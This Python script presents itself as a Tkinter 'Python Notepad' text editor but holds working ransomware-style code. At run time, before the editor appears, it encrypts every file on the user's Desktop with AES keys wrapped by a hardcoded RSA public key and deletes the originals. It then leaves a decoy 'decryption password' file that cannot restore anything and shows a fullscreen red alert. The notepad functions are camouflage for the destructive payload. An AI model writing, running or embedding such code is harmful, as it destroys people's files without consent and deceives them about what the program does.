import os
import ctypes
import tkinter as tk
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from tkinter import filedialog
from tkinter import messagebox

# Hardcoded RSA Public Key
public_key_data = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxEDi8gVFq9yoBv2rHq2q
xwV51Kc7rcSK3NC8UENtc9sxXtGeRckT3mLWbvoIJtOWeqJUEGfxVmreoMfynBgv
CeNobxShMjyx8Ijxh5jhqXBSYIikr099kKOktSva2AnuLT8fWvsfmaqbDDKZkngC
zQCIqw1GBswNdcuSWzxv2T2JHgTQH+CSBy7M1tx64zRxqeEokWofMfcsEa9M4GVo
7DRzlarsyjxilG9hQHf24YWJq4F+eWu6Z5FERMC+OU9XvZY0dCPbEyz5Sv5XgUZu
lDkDmPLc3AZuSzxRcSMwyX3qf7Nwg1GwKVc3EfYe+Vjz/QQFDiiqvhTTZhRdCrmX
GwIDAQAB
-----END PUBLIC KEY-----'''

public_key = RSA.import_key(public_key_data)
cipher_rsa = PKCS1_OAEP.new(public_key)

desktop_path = os.path.expanduser("~/Desktop")

# Function to Encrypt Files
def encrypt_file(file_path, cipher_rsa):
    if file_path.endswith(".enc"):
        return  # If file is already encrypted, skip it

    aes_key = get_random_bytes(32)
    cipher_aes = AES.new(aes_key, AES.MODE_CBC)

    with open(file_path, "rb") as f:
        file_data = f.read()

    encrypted_data = cipher_aes.encrypt(pad(file_data, AES.block_size))
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)

    with open(file_path + ".enc", "wb") as f:
        f.write(cipher_aes.iv)
        f.write(encrypted_aes_key)
        f.write(encrypted_data)

    os.remove(file_path)

# Function to Encrypt All Files in a Directory
def encrypt_directory(directory, cipher_rsa):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, cipher_rsa)

# Encrypt all files on Desktop
encrypt_directory(desktop_path, cipher_rsa)

# Create a Decryption Password File
password_file = os.path.join(desktop_path, "Decryption_password.txt")
with open(password_file, "w") as f:
    f.write("utssob uui z")

# Function to Show Fullscreen Alert
def show_alert():
    root = tk.Tk()
    root.attributes('-fullscreen', True)  # Full-screen mode
    root.configure(bg="black")  # Background black

    label = tk.Label(root, text="Your files have been encrypted successfully!\nCheck Decryption_password.txt for recovery.", 
                     font=("Arial", 24, "bold"), fg="red", bg="black")  # Red text
    label.pack(expand=True)  # Center text

    root.after(3000, root.destroy)  # Close alert after 10 seconds
    root.mainloop()

# Tkinter Text Editor (Notepad)
def create_notepad():
    # Create main application window
    root = tk.Tk()
    root.title("Python Notepad")
    root.geometry("600x400")

    # Function to create a new file
    def new_file():
        text_area.delete(1.0, tk.END)
        root.title("Python Notepad - New File")

    # Function to open an existing file
    def open_file():
        file = filedialog.askopenfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if file:
            with open(file, "r") as f:
                text_area.delete(1.0, tk.END)
                text_area.insert(tk.END, f.read())
                root.title(f"Python Notepad - {file}")

    # Function to save the current file
    def save_file():
        file = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if file:
            with open(file, "w") as f:
                f.write(text_area.get(1.0, tk.END))
                root.title(f"Python Notepad - {file}")

    # Function to handle the "Exit" event
    def exit_app():
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            root.quit()

    # Creating the Text Area for the Notepad
    text_area = tk.Text(root, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH)

    # Creating the Menu Bar
    menu_bar = tk.Menu(root)
    root.config(menu=menu_bar)

    # Adding File Menu
    file_menu = tk.Menu(menu_bar, tearoff=0)
    menu_bar.add_cascade(label="File", menu=file_menu)
    file_menu.add_command(label="New", command=new_file)
    file_menu.add_command(label="Open", command=open_file)
    file_menu.add_command(label="Save", command=save_file)
    file_menu.add_separator()
    file_menu.add_command(label="Exit", command=exit_app)

    # Start the Notepad Application
    root.mainloop()

# Start Notepad
create_notepad()

# Show Alert for encryption success
show_alert()
